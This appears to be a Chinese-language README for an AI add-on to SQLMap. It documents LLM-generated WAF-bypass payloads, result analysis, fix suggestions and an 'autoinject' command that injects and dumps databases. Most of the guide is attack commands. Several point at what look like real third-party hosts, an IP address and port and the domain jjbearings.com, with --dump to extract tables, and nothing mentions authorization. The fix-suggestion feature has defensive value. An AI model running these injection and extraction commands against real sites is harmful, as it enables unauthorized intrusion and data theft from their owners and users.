# SQLMap AI模块使用指南

## 概述

SQLMap AI模块是对SQLMap工具的增强，通过集成大型语言模型(LLM)赋予SQLMap更智能的能力。该模块提供：

1. **智能Payload生成**：根据目标数据库类型自动生成绕过WAF的注入payload
2. **扫描结果分析**：深入分析扫描结果，提供详细的漏洞解释
3. **漏洞解释**：详细说明发现的漏洞原理和潜在危害
4. **修复建议**：提供针对性的安全修复方案
5. **交互式CLI**：提供友好的命令行交互界面
6. **自动注入**：AI扫描后自动执行注入攻击并分析结果
7. **简化版自动注入**：优化的自动注入功能，提高稳定性和成功率

## 安装与配置

### 前提条件

- Python 3.7+
- SQLMap 1.9+
- 有效的API密钥
- 必需依赖：
  ```
  requests>=2.31.0
  keyring>=24.3.0
  python-dotenv>=1.0.0
  ```

### 安装依赖

可以使用以下命令安装所需依赖：

```bash
pip install -r requirements.txt
```

### API密钥管理

SQLMap AI模块提供三种API密钥管理方式（按安全性排序）：

1. **系统密钥环（推荐）**
   ```bash
   # 设置API密钥
   python -m ai_module config --set-key
   
   # 查看密钥存储位置
   python -m ai_module config --show-key-location
   
   # 移除密钥
   python -m ai_module config --remove-key
   ```

2. **环境变量**
   ```bash
   # Linux/macOS
   export SQLMAP_AI_KEY='your-api-key-here'
   
   # Windows
   set SQLMAP_AI_KEY=your-api-key-here
   ```

3. **配置文件（不推荐）**
   ```ini
   [API]
   key = your_api_key_here
   ```

### 代理API配置

如果使用代理API服务，在`ai_config.ini`中配置：

```ini
[API]
openai_api_base = https://your-proxy-api.com/v1
openai_auth_type = bearer  # 可选: bearer, api_key, custom
openai_auth_header = Authorization
openai_auth_prefix = Bearer
```

## 使用方法

### 基础使用

1. **启动AI交互式命令行界面**
   ```bash
   python sqlmap.py --ai-cli
   ```
   这将启动一个交互式界面，您可以在其中：
   - 生成注入payload
   - 分析扫描结果
   - 获取漏洞解释
   - 获取修复建议

2. **智能注入测试**
   ```bash
   # 基本用法
   python sqlmap.py -u "http://124.70.71.251:48385/new_list.php?id=1" --smart-payload
   
   # 指定数据库类型
   python sqlmap.py -u "http://example.com/vuln.php?id=1" --smart-payload --dbms=mysql
   
   # 结合其他SQLMap选项
   python sqlmap.py -u "http://example.com/vuln.php?id=1" --smart-payload --risk=3 --level=5
   ```

3. **扫描结果分析**
   ```bash
   # 实时分析
   python sqlmap.py -u "http://124.70.71.251:48385/new_list.php?id=1" --ai-analysis
   
   # 分析并解释漏洞
   python sqlmap.py -u "http://124.70.71.251:48385/new_list.php?id=1" --ai-analysis --explain-vuln
   
   # 完整分析（包含修复建议）
   python sqlmap.py -u "http://example.com/vuln.php?id=1" --ai-analysis --explain-vuln --suggest-fix
   ```

4. **批量测试**
   ```bash
   # 从文件读取目标
   python sqlmap.py -m targets.txt --smart-payload --ai-analysis
   
   # 从Burp日志分析
   python sqlmap.py -l burp.log --smart-payload --ai-analysis
   ```

5. **简化版自动注入** *(新功能)*
   ```bash
   # 基本用法
   python -m ai_module autoinject "http://124.70.71.251:48385/new_list.php?id=1"
   
   # 指定数据库类型
   python -m ai_module autoinject "http://124.70.71.251:48385/new_list.php?id=1" --dbms mysql
   
   # 提取数据
   python -m ai_module autoinject "http://124.70.71.251:48385/new_list.php?id=1" --dump
   ```

### AI CLI模式详解

在AI CLI模式下（通过 `--ai-cli` 启动），提供以下详细命令：

1. **payload命令**：生成SQL注入payload
   ```bash
   # 基本语法
   payload <数据库类型> <注入类型> [选项]
   
   # 示例
   sqlmap-ai> payload mysql union         # 生成MySQL联合查询注入
   sqlmap-ai> payload postgresql time     # 生成PostgreSQL时间盲注
   sqlmap-ai> payload oracle boolean      # 生成Oracle布尔盲注
   sqlmap-ai> payload mysql union --waf   # 生成绕过WAF的payload
   ```

2. **analyze命令**：分析扫描结果
   ```bash
   # 基本语法
   analyze "<扫描结果描述>"
   
   # 示例
   sqlmap-ai> analyze "在id参数发现MySQL时间盲注，延迟5秒"
   sqlmap-ai> analyze "WAF拦截了UNION SELECT语句"
   sqlmap-ai> analyze "成功获取到数据库版本：MySQL 5.7.32"
   ```

3. **explain命令**：解释漏洞原理
   ```bash
   # 基本语法
   explain "<漏洞类型>"
   
   # 示例
   sqlmap-ai> explain "MySQL时间盲注"
   sqlmap-ai> explain "Oracle UNION查询注入"
   sqlmap-ai> explain "SQLite布尔盲注"
   ```

4. **fix命令**：提供修复建议
   ```bash
   # 基本语法
   fix "<漏洞描述>"
   
   # 示例
   sqlmap-ai> fix "MySQL联合查询注入漏洞"
   sqlmap-ai> fix "参数id存在时间盲注"
   sqlmap-ai> fix "存储过程注入漏洞"
   ```

5. **autoinject命令**：自动扫描和注入
   ```bash
   # 基本语法
   autoinject <目标URL> [选项]
   
   # 选项
   --dbms <类型>     指定数据库类型（mysql, postgresql等）
   --dump           提取数据
   --tables <表名>   指定要提取的表
   --verbose        详细输出
   --timeout <秒>    设置超时时间
   
   # 示例
   sqlmap-ai> autoinject http://example.com/vulnerable.php?id=1
   sqlmap-ai> autoinject http://example.com/page.php?id=1 --dbms mysql --dump
   sqlmap-ai> autoinject http://example.com/api.php?id=1 --dump --tables users
   sqlmap-ai> autoinject http://example.com/search.php?q=1 --verbose --timeout 60
   ```

6. **help命令**：获取帮助信息
   ```bash
   sqlmap-ai> help              # 显示所有命令
   sqlmap-ai> help payload      # 显示payload命令详细用法
   sqlmap-ai> help analyze      # 显示analyze命令详细用法
   ```

### 高级使用场景

1. **自定义注入场景**
   ```bash
   # 指定注入点
   python sqlmap.py -u "http://example.com/vuln.php?id=1" --smart-payload --param-mark="*"
   
   # 自定义HTTP头注入
   python sqlmap.py -u "http://example.com/api" --headers="X-Custom-Header: *" --smart-payload
   
   # JSON数据注入
   python sqlmap.py -u "http://example.com/api" --data='{"id": "*"}' --smart-payload
   ```

2. **与其他工具集成**
   ```bash
   # 结合Burp Suite
   python sqlmap.py -r request.txt --smart-payload --ai-analysis
   
   # 通过代理
   python sqlmap.py -u "http://example.com" --proxy="http://127.0.0.1:8080" --smart-payload
   ```

3. **自动化测试**
   ```bash
   # 批量目标扫描
   python sqlmap.py -m targets.txt --smart-payload --ai-analysis --batch
   
   # 定时任务
   python sqlmap.py -u "http://example.com" --smart-payload --ai-analysis --output-dir="daily_scan"
   
   # 自动注入（新简化版）
   python -m ai_module autoinject "http://example.com/vuln.php?id=1" --dbms mysql --dump
   ```

4. **结果导出**
   ```bash
   # 导出AI分析报告
   python sqlmap.py -u "http://example.com" --ai-analysis --report-format=pdf
   
   # 导出建议修复方案
   python sqlmap.py -u "http://example.com" --suggest-fix --output-format=markdown
   ```

### 环境变量配置

可以通过环境变量控制AI模块的行为：

```bash
# Windows
set SQLMAP_AI_DEBUG=1                # 启用调试模式
set SQLMAP_AI_CACHE_DIR=D:\cache     # 自定义缓存目录
set SQLMAP_AI_TIMEOUT=60             # 设置API超时时间（秒）

# Linux/macOS
export SQLMAP_AI_DEBUG=1
export SQLMAP_AI_CACHE_DIR=/tmp/cache
export SQLMAP_AI_TIMEOUT=60
```

## 最佳实践

1. **API密钥管理**
   - 使用系统密钥环存储API密钥
   - 定期轮换API密钥
   - 避免在代码或配置文件中硬编码密钥

2. **性能优化**
   - 启用缓存减少API调用
   - 适当设置超时时间
   - 根据需要调整并发设置

3. **自定义配置**
   - 根据实际需求调整模型参数
   - 自定义提示词模板
   - 配置代理服务器

4. **自动注入优化** *(新增)*
   - 使用简化版自动注入提高成功率
   - 明确指定数据库类型加快扫描速度
   - 优先使用常见参数名（如id, user_id等）

## 故障排除

**Q: API调用失败怎么办？**

A: 检查以下几点：
- 确认API密钥是否正确
- 检查网络连接是否正常
- 查看是否超出API调用限制
- 检查代理配置是否正确

**Q: 智能分析结果不准确？**

A: 可以尝试以下解决方案：
- 提供更详细的目标信息（如明确指定DBMS类型）
- 调整模型参数（如增加温度、最大令牌数等）
- 更新至最新版本的AI模块

**Q: 缓存不工作？**

A: 可能的原因：
- 缓存目录权限问题
- 缓存配置未正确启用
- 缓存过期时间设置过短

解决方法：
```bash
# 检查缓存目录
python -m ai_module cache --status

# 清理缓存
python -m ai_module cache --clear

# 重建缓存
python -m ai_module cache --rebuild
```

**Q: 自动注入失败？** *(新增)*

A: 可能的原因：
- URL格式不正确
- 目标网站无漏洞或有WAF保护
- 参数名称不匹配
- 数据库类型指定错误

解决方法：
```bash
# 尝试指定正确的数据库类型
python -m ai_module autoinject "http://example.com/page.php?id=1" --dbms mysql

# 使用更基本的命令减少复杂性
python -m ai_module autoinject "http://example.com/page.php?id=1" --batch

# 查看详细输出进行调试
python -m ai_module autoinject "http://example.com/page.php?id=1" --verbose
```

**Q: 如何查看目标的数据库?**

A: 使用 `--dbs` 参数列出所有可用的数据库:
```bash
python -m ai_module autoinject "http://example.com/page.php?id=1" --dbms mysql --dbs
```
这将显示目标系统上的所有可用数据库。

**Q: 如何提取数据库内容?**

A: 使用 `--dump` 参数自动提取数据库表内容:
```bash
python -m ai_module autoinject "http://example.com/page.php?id=1" --dbms mysql --dump
```
这将自动扫描数据库，提取表结构和表内容。

**Q: 如何处理真实服务器不可用的情况?**

A: 如果真实的目标服务器不可用或无法连接:
1. 检查URL是否正确
2. 确认目标服务器是否在线
3. 检查网络连接是否正常
4. 尝试使用本地测试环境

**Q: 如何在没有网络的环境中使用？**

A: AI模块默认需要网络连接以访问API服务，但您可以：
- 使用本地部署的模型（需额外配置）
- 启用离线模式，使用内置的基础分析规则

## 具体使用案例

### 案例1：对特定数据库的高级注入

以MySQL数据库为例，进行深度注入测试：

```bash
# 步骤1：初始扫描
python sqlmap.py -u "http://jjbearings.com/userabout.php?id=1" --dbms=mysql --ai-analysis

# 步骤2：使用智能payload
python sqlmap.py -u "http://jjbearings.com/userabout.php?id=1" --dbms=mysql --smart-payload --technique=U

# 步骤3：获取详细解释并建议修复方案
python sqlmap.py -u "http://jjbearings.com/userabout.php?id=1" --dbms=mysql --ai-analysis --explain-vuln --suggest-fix

# 步骤4：使用简化版自动注入功能 (新增)
python -m ai_module autoinject "http://jjbearings.com/userabout.php?id=1" --dbms mysql --dump
```

### 案例2：绕过WAF保护的网站

针对有WAF保护的目标：

```bash
# 步骤1：识别WAF
python sqlmap.py -u "http://target.com/page.php?id=1" --identify-waf

# 步骤2：使用智能payload绕过WAF
python sqlmap.py -u "http://target.com/page.php?id=1" --smart-payload --tamper=space2comment,charencode

# 步骤3：分析结果
python sqlmap.py -u "http://target.com/page.php?id=1" --smart-payload --tamper=space2comment,charencode --ai-analysis

# 步骤4：使用简化版自动注入 (新增)
python -m ai_module autoinject "http://target.com/page.php?id=1" --dbms mysql --batch
```

### 案例3：REST API测试

针对现代REST API的测试：

```bash
# 步骤1：准备请求文件
# (将API请求保存到req.txt，包含必要的头部和认证信息)

# 步骤2：使用智能payload测试
python sqlmap.py -r req.txt --smart-payload --data='{"userId": "*"}'

# 步骤3：分析结果并获取修复建议
python sqlmap.py -r req.txt --ai-analysis --explain-vuln --suggest-fix

# 步骤4：使用简化版自动注入 (新增)
# (需要先从请求文件中提取URL和参数)
python -m ai_module autoinject "https://api.example.com/users?id=1" --dbms postgresql
```

### 案例4：大规模渗透测试

在企业环境中进行大规模测试：

```bash
# 步骤1：准备目标列表
# (targets.txt 包含多个目标URL)

# 步骤2：批量扫描
python sqlmap.py -m targets.txt --smart-payload --batch --threads=5

# 步骤3：生成综合报告
python sqlmap.py -m targets.txt --ai-analysis --report-format=pdf --output-dir=scan_results

# 步骤4：对发现的漏洞进行自动注入 (新增)
# (针对发现的漏洞URL逐个进行自动注入)
python -m ai_module autoinject "http://vulnerable-target.com/page.php?id=1" --dump
```

### 案例5：自动注入测试 (更新)

完全自动化的SQL注入测试流程，使用新的简化版自动注入功能：

```bash
# 基本自动注入
python -m ai_module autoinject "http://target.com/page.php?id=1"

# 指定数据库类型
python -m ai_module autoinject "http://target.com/page.php?id=1" --dbms mysql

# 自动注入并提取数据
python -m ai_module autoinject "http://target.com/page.php?id=1" --dump

# 指定表并提取
python -m ai_module autoinject "http://target.com/page.php?id=1" --dump --tables users,admin

# 交互式方式
python -m ai_module cli
sqlmap-ai> autoinject http://target.com/page.php?id=1 --dbms mysql --dump
```

## 自定义与扩展

### 自定义提示词模板

您可以通过编辑`ai_module/prompts.py`自定义提示词模板：

```python
# 示例：自定义漏洞解释模板
VULNERABILITY_EXPLANATION_TEMPLATE = """
详细分析下面的{dbms}数据库{vuln_type}注入漏洞:
1. 原理
2. 攻击向量
3. 安全影响
4. 修复方法
5. 相关CVE或漏洞编号
"""
```

### 集成自定义模型

如果您想使用不同的AI模型，可在`ai_config.ini`中配置：

```ini
[API]
openai_model = your-custom-model-name
openai_api_base = https://custom-model-api.com/v1
```

### 添加新功能

您可以通过扩展`ai_module`目录中的代码来添加新功能。例如，要添加新的分析功能：

1. 在`ai_module/core.py`中添加新函数
2. 在`sqlmap.py`中适当的位置调用该函数
3. 更新命令行参数以支持新功能

## 国际化支持

SQLMap AI模块支持多语言输出，可以通过环境变量或配置文件设置：

```bash
# 设置输出语言
export SQLMAP_AI_LANG=zh_CN  # 中文
export SQLMAP_AI_LANG=en_US  # 英文
export SQLMAP_AI_LANG=ja_JP  # 日文
```

也可以在配置文件中设置：

```ini
[GENERAL]
language = zh_CN
```

## 版本历史与更新

### v1.0.0 (初始版本)
- 基础AI分析功能
- 智能payload生成
- 漏洞解释与修复建议

### v1.1.0
- 添加国际化支持
- 改进缓存机制
- 优化API调用效率

### v1.2.0
- 添加更多数据库类型支持
- 改进WAF绕过能力
- 增加批量扫描功能

### v1.3.0
- 添加AI扫描后自动注入功能
- 增强注入结果分析能力
- 优化交互式CLI界面

### v1.4.0 
- 添加简化版自动注入功能，提高稳定性
- 修复参数处理问题
- 优化错误处理和调试信息
- 添加更多使用案例和故障排除指南

### v1.4.1 (最新版本)
- 修复了一些BUG

## 贡献与反馈

欢迎提交问题报告、功能请求或贡献代码：

1. 在GitHub上提交Issue
2. 提交Pull Request
3. 发送反馈至维护者邮箱

## 许可证

SQLMap AI模块遵循与SQLMap相同的许可证，详见项目根目录的LICENSE文件。